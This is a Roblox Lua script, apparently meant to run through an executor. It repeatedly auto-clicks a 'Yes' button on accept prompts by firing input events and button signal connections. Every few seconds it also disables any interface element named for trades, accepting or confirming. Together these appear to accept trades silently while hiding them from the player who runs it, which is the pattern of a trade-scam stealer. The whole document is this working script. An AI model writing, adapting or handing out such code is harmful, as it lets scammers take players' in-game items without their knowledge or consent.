local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local function resetTradeUI()
    pcall(function()
        local tabs = playerGui:FindFirstChild("Tabs")
        if tabs then
            local areYouSure = tabs:FindFirstChild("Are You Sure")
            if areYouSure then
                areYouSure.Enabled = false
            end
            tabs.Enabled = false
        end
        GuiService.SelectedObject = nil
    end)

    pcall(function()
        for _, gui in ipairs(playerGui:GetDescendants()) do
            if gui:IsA("ScreenGui") or gui:IsA("Frame") then
                if gui.Name:lower():find("accept") or gui.Name:lower():find("trade") or gui.Name:lower():find("confirm") then
                    gui.Enabled = false
                end
            end
        end
    end)
end

local function clickButton(button)
    if not button or not button.Parent then return end

    pcall(function()
        GuiService.SelectedObject = button
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
        task.wait(0.02)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
    end)

    pcall(function()
        for _, signal in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down", "MouseButton1Up"}) do
            for _, conn in ipairs(getconnections(button[signal])) do
                pcall(function() conn:Fire() end)
            end
        end
    end)
end

local function findYesButton()
    for _, gui in ipairs(playerGui:GetDescendants()) do
        if gui:IsA("TextButton") and gui.Visible and gui.Text == "Yes" then
            local parent = gui.Parent
            while parent and parent \~= playerGui do
                if parent:IsA("Frame") or parent:IsA("ScreenGui") then
                    for _, label in ipairs(parent:GetDescendants()) do
                        if label:IsA("TextLabel") and label.Text:find("Accept") then
                            return gui
                        end
                    end
                end
                parent = parent.Parent
            end
        end
    end
    return nil
end

task.spawn(function()
    while true do
        resetTradeUI()
        task.wait(5)
    end
end)

while true do
    local yesButton = findYesButton()
    if yesButton then
        local start = tick()
        while yesButton and yesButton.Parent and yesButton.Visible and (tick() - start < 4) do
            clickButton(yesButton)
            task.wait(0.1)
        end
        resetTradeUI()
    end
    task.wait(0.05)
end
